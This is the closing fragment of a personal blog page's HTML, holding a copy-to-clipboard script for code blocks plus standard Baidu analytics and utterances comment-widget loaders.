    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>